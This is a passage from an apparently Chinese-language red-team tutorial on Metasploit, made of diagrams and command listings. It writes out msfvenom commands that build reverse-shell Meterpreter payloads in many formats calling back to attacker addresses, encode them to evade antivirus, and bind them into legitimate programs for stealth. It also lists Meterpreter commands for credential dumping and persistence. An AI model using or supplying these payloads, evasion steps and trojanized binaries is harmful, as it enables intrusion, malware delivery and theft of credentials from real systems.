font-family="Consolas,Monospace"></text>  <rect x="30" y="441" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="180" y="441" width="230" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="420" y="441" width="260" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="690" y="441" width="220" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="441" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <text x="100.0" y="467" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">Python 跨平台</text>  <text x="188" y="457" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">python/shell_bind_tcp</text>  <text x="188" y="473" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="457" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">python/shell_reverse_tcp LHOST=1.2</text>  <text x="428" y="473" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">.3.4</text>  <text x="698" y="457" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">python/meterpreter/reverse_https</text>  <text x="698" y="473" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="928" y="457" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">python/exec CMD="os.system('id')"</text>  <text x="928" y="473" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="540.0" y="505" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">实战最常用=Reverse + Meterpreter；Bind 只用在目标公网 IP 没出网的情况</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 530" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s11g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s11b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s11r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s11a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s11s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s11g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-11 三类 Payload 拓扑：Bind / Reverse / Meterpreter</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">网络怎么走、谁连谁、为什么选 Reverse 一眼看懂</text>  <rect x="60" y="100" width="300" height="38" rx="8" fill="#ef4444" opacity="0.2" stroke="#ef4444"/>  <text x="210.0" y="124" text-anchor="middle" font-size="14" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">① Bind Shell</text>  <rect x="120" y="190" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="210.0" y="224.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">攻击者 192.168.1.100</text>  <rect x="120" y="340" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="210.0" y="374.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">目标机 :4444 LISTEN</text>  <path d="M210,250 L210,340" stroke="#ef4444" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="210.0" y="290.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">主动 connect :4444</text>  <rect x="60" y="440" width="300" height="62" rx="6" fill="#0f172a" stroke="#334155"/>  <text x="68" y="460" font-size="10.5" fill="#a7f3d0" font-family="Microsoft YaHei,Arial">+ 不用攻击者公网 IP</text>  <text x="68" y="485" font-size="10.5" fill="#fecaca" font-family="Microsoft YaHei,Arial">- 目标防火墙会拦截入站 :4444</text>  <rect x="380" y="100" width="300" height="38" rx="8" fill="#f59e0b" opacity="0.2" stroke="#f59e0b"/>  <text x="530.0" y="124" text-anchor="middle" font-size="14" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">② Reverse Shell</text>  <rect x="440" y="190" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="530.0" y="224.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">攻击者 handler 监听 :4444</text>  <rect x="440" y="340" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="530.0" y="374.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">目标机 执行 payload</text>  <path d="M530,340 L530,250" stroke="#f59e0b" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="530.0" y="290.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">反向连 1.2.3.4:4444</text>  <rect x="380" y="440" width="300" height="62" rx="6" fill="#0f172a" stroke="#334155"/>  <text x="388" y="460" font-size="10.5" fill="#a7f3d0" font-family="Microsoft YaHei,Arial">+ 绕过绝大多数入站防火墙</text>  <text x="388" y="485" font-size="10.5" fill="#fecaca" font-family="Microsoft YaHei,Arial">- 攻击者必须有公网 IP/frp 隧道</text>  <rect x="700" y="100" width="300" height="38" rx="8" fill="#10b981" opacity="0.2" stroke="#10b981"/>  <text x="850.0" y="124" text-anchor="middle" font-size="14" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">③ Meterpreter（推荐）</text>  <rect x="760" y="180" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="850.0" y="214.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">Attacker msfconsole 控制台</text>  <rect x="760" y="360" width="180" height="60" rx="10" ry="10" fill="#1e293b" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="850.0" y="394.5" text-anchor="middle" font-size="11" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">目标机 Meterpreter DLL 内存驻留</text>  <path d="M850,360 L850,240" stroke="#10b981" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="850.0" y="295.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">① HTTPS 加密回连</text>  <path d="M890,240 L890,360" stroke="#0ea5e9" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <text x="890.0" y="295.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">② 下发命令/文件</text>  <path d="M810,240 L810,360" stroke="#8b5cf6" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <text x="810.0" y="295.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">③ kiwi/portfwd</text>  <rect x="700" y="440" width="300" height="62" rx="6" fill="#0f172a" stroke="#334155"/>  <text x="708" y="460" font-size="10.5" fill="#a7f3d0" font-family="Microsoft YaHei,Arial">+ 全内存+加密+功能最全=实战首选</text>  <text x="708" y="485" font-size="10.5" fill="#fecaca" font-family="Microsoft YaHei,Arial">- 体积略大，免杀需配编码器+加载器</text>  <text x="540.0" y="510" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">红队实战 95% 以上选 ③ Meterpreter + HTTPS + 编码 + 自定义加载器</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 520" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s12g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s12b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s12r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s12a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s12s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s12g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-12 Encoder 免杀原理：迭代混淆 + 解码器自还原</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">杀毒看字节特征；编码器打乱字节，解码器现场还原</text>  <rect x="40" y="170" width="180" height="110" rx="10" ry="10" fill="#ef4444" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="130.0" y="230.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">原始 Payload 固定字节 AAAA BBBB 特征明显秒杀</text>  <rect x="260" y="170" width="170" height="110" rx="10" ry="10" fill="#8b5cf6" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="345.0" y="230.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">Encoder 第 1 轮 shikata_ga_nai XOR 1/20</text>  <rect x="446" y="170" width="170" height="110" rx="10" ry="10" fill="#a855f7" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="531.0" y="230.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">Encoder 第 2 轮 shikata_ga_nai XOR 2/20</text>  <path d="M430,225 L442,225" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="436.0" y="220.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">打乱</text>  <rect x="632" y="170" width="170" height="110" rx="10" ry="10" fill="#d946ef" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="717.0" y="230.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">Encoder 第 3 轮 shikata_ga_nai XOR 3/20</text>  <path d="M616,225 L628,225" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="622.0" y="220.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">打乱</text>  <path d="M220,225 L260,225" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="240.0" y="220.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输入</text>  <path d="M720,225 L770,225" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="745.0" y="220.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">输出 exe</text>  <rect x="770" y="170" width="250" height="110" rx="10" ry="10" fill="#10b981" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="895.0" y="230.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">最终：解码器头 + NOP 雪橇 + 加密 payload 静态扫描看不到原字节</text>  <line x1="895" y1="280" x2="895" y2="320" stroke="#60a5fa" stroke-width="2.2" stroke-dasharray="4 3" marker-end="url(#s01a)"/>  <rect x="640" y="340" width="380" height="80" rx="10" ry="10" fill="#0ea5e9" stroke="#334155" stroke-width="1.2" filter="url(#s01s)"/>  <text x="830.0" y="385.0" text-anchor="middle" font-size="12" fill="#f8fafc" font-weight="600" font-family="Microsoft YaHei,Arial">CPU 执行解码器：① 自解密还原 ② 真实 payload ③ 跳转执行 全在内存中无落地</text>  <rect x="40" y="340" width="540" height="110" rx="10" fill="#020617" stroke="#334155"/>  <text x="60" y="364" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">实战编码器命令：</text>  <text x="60" y="388" font-size="10" fill="#86efac" font-family="Consolas,Monospace">msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 -e x86/shikata_ga_nai -i 20 -b "\x00" -f exe -o ok.exe</text>  <text x="60" y="410" font-size="10" fill="#86efac" font-family="Consolas,Monospace">msfvenom -p win/x64/meterpreter/reverse_https ... -e x64/xor_dynamic -i 15 -encrypt aes256</text>  <text x="60" y="434" font-size="11" fill="#fde68a" font-family="Microsoft YaHei,Arial">-i 迭代10~25轮 = 静态查杀率下降；-b \x00 避免坏字符截断</text>  <text x="540.0" y="500" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">纯 Encoder 已过不了国内主流云查杀，进阶需 Donut/Loader/SGN 自定义壳</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 510" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s13g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s13b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s13r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s13a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s13s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s13g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-13 六大模块攻击数据流全管线</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">每模块输出=下一模块输入，标准化流水线作业</text>  <rect x="50" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2" filter="url(#s01s)"/>  <text x="125" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① Auxiliary</text>  <line x1="65" y1="226" x2="185" y2="226" stroke="#334155"/>  <text x="60" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">侦察端口/服务/弱口令/CVE</text>  <text x="60" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <path d="M200,255 L212,255" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="206.0" y="250.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">传参</text>  <rect x="210" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2.2" filter="url(#s01s)"/>  <text x="285" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">② Exploit</text>  <line x1="225" y1="226" x2="345" y2="226" stroke="#334155"/>  <text x="220" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">选匹配漏洞+设目标参数</text>  <text x="220" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <path d="M360,255 L372,255" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="366.0" y="250.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">传参</text>  <rect x="370" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2" filter="url(#s01s)"/>  <text x="445" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ Encoder</text>  <line x1="385" y1="226" x2="505" y2="226" stroke="#334155"/>  <text x="380" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">shikata/xor多轮混淆</text>  <text x="380" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <path d="M520,255 L532,255" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="526.0" y="250.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">传参</text>  <rect x="530" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2.2" filter="url(#s01s)"/>  <text x="605" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ Nops</text>  <line x1="545" y1="226" x2="665" y2="226" stroke="#334155"/>  <text x="540" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">空指令雪橇绕过坏字符对齐</text>  <text x="540" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <path d="M680,255 L692,255" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="686.0" y="250.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">传参</text>  <rect x="690" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2.2" filter="url(#s01s)"/>  <text x="765" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑤ Payload</text>  <line x1="705" y1="226" x2="825" y2="226" stroke="#334155"/>  <text x="700" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Bind/Reverse/Meter</text>  <text x="700" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">preter投递</text>  <path d="M840,255 L852,255" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="846.0" y="250.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">传参</text>  <rect x="850" y="180" width="150" height="150" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2.2" filter="url(#s01s)"/>  <text x="925" y="210" text-anchor="middle" font-size="14" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ Post</text>  <line x1="865" y1="226" x2="985" y2="226" stroke="#334155"/>  <text x="860" y="250" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">后渗hashdump/提权/横向</text>  <text x="860" y="268" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="50" y="380" width="980" height="70" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="2" stroke-dasharray="6 3"/>  <text x="540" y="410" text-anchor="middle" font-size="15" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">全程落盘 PostgreSQL(msfdb)：hosts / services / vulns / creds / loot</text>  <text x="540" y="432" text-anchor="middle" font-size="12" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">随时 hosts / services / creds -O / loot 导出 CSV/XLSX 写报告</text>  <text x="540.0" y="475" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">db_status 看连接；db_import 导入外部 nmap/nessus XML</text>
</svg>



### MSFvenom 是什么？

MSFvenom是Payload生成工具，可以生成各种格式的恶意代码，用于：
- 生成可执行文件
- 生成脚本文件
- 生成DLL文件
- 生成各种格式的Payload

### MSFvenom 基本使用

**查看所有Payload：**
```bash
msfvenom -l payloads
```

**查看所有格式：**
```bash
msfvenom -l formats
```

**生成Payload基本命令：**
```bash
msfvenom -p payload LHOST=ip LPORT=port -f format -o output_file
```

### 生成 Windows Payload

**生成EXE文件：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```

**生成DLL文件：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o payload.dll
```

**生成VBS脚本：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vbs -o payload.vbs
```

**生成BAT脚本：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f bat -o payload.bat
```

### 生成 Linux Payload

**生成ELF文件：**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
```

### 生成 Web Payload

**生成PHP文件：**
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f php -o payload.php
```

**生成JSP文件：**
```bash
msfvenom -p jsp/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f jsp -o payload.jsp
```

**生成WAR文件（Java Web应用）：**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o payload.war
```

### 生成 PowerShell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o payload.ps1
```

或生成Base64编码版本：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd -o payload.txt
```

### Payload编码

使用编码器绕过检测：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

参数说明：
- `-e`：指定编码器
- `-i`：编码次数

**常用编码器：**
```bash
msfvenom -l encoders
```

| 编码器 | 说明 |
|------|------|
| x86/shikata_ga_nai | 最常用 |
| cmd/powershell_base64 | PowerShell编码 |
| x86/countdown | 计数编码 |
| x86/call4_dword_xor | XOR编码 |

### Payload绑定到正常程序

将Payload注入正常程序，更隐蔽：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/normal.exe -k -f exe -o binded.exe
```

参数说明：
- `-x`：正常程序路径
- `-k`：保留原程序功能

---

## 3.8 六大模块详解


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 530" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s14g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s14b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s14r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s14a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s14s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s14g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-14 Meterpreter 6 大类 24 条高频命令速查</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">进入 session 后常用命令 24 条，记好直接用</text>  <rect x="30" y="110" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6"/>  <rect x="30" y="110" width="335" height="30" rx="10" fill="#0ea5e9" opacity="0.22"/>  <text x="40" y="130" font-size="13" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">①系统信息</text>  <text x="42" y="158" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- sysinfo</text>  <text x="42" y="177" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- getuid</text>  <text x="42" y="196" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- getpid</text>  <text x="42" y="215" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- ps</text>  <text x="42" y="234" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- migrate 1234</text>  <text x="42" y="253" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- getsystem</text>  <text x="42" y="272" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- pgrep explorer</text>  <rect x="385" y="110" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6"/>  <rect x="385" y="110" width="335" height="30" rx="10" fill="#a855f7" opacity="0.22"/>  <text x="395" y="130" font-size="13" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">②文件操作</text>  <text x="397" y="158" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- pwd / lpwd</text>  <text x="397" y="177" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- cd / lcd</text>  <text x="397" y="196" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- ls / lls</text>  <text x="397" y="215" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- cat flag.txt</text>  <text x="397" y="234" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- download/upload</text>  <text x="397" y="253" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- edit / mkdir</text>  <text x="397" y="272" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- rm / rmdir</text>  <rect x="30" y="352" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6"/>  <rect x="30" y="352" width="335" height="30" rx="10" fill="#ef4444" opacity="0.22"/>  <text x="40" y="372" font-size="13" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">③网络操作</text>  <text x="42" y="400" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- ipconfig</text>  <text x="42" y="419" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- netstat -ano</text>  <text x="42" y="438" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- arp</text>  <text x="42" y="457" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- route add 内网段</text>  <text x="42" y="476" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- portfwd 转发</text>  <text x="42" y="495" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- run get_local_subnets</text>  <text x="42" y="514" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- background</text>  <rect x="385" y="352" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6"/>  <rect x="385" y="352" width="335" height="30" rx="10" fill="#8b5cf6" opacity="0.22"/>  <text x="395" y="372" font-size="13" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">④凭证窃取</text>  <text x="397" y="400" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- hashdump</text>  <text x="397" y="419" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- run wdigest</text>  <text x="397" y="438" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- load kiwi creds_all</text>  <text x="397" y="457" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- smart_hashdump</text>  <text x="397" y="476" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- post/windows/gather/creds</text>  <text x="397" y="495" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- run vssown</text>  <text x="397" y="514" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- lsadump::sam</text>  <rect x="30" y="594" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6"/>  <rect x="30" y="594" width="335" height="30" rx="10" fill="#f59e0b" opacity="0.22"/>  <text x="40" y="614" font-size="13" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑤权限维持</text>  <text x="42" y="642" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- run persistence -X -i 30</text>  <text x="42" y="661" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- run metsvc</text>  <text x="42" y="680" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- reg setval ...</text>  <text x="42" y="699" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- post/manage/persistence_exe</text>  <text x="42" y="718" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- upload后门.exe</text>  <text x="42" y="737" font-size="10" fill="#e2e8f0" 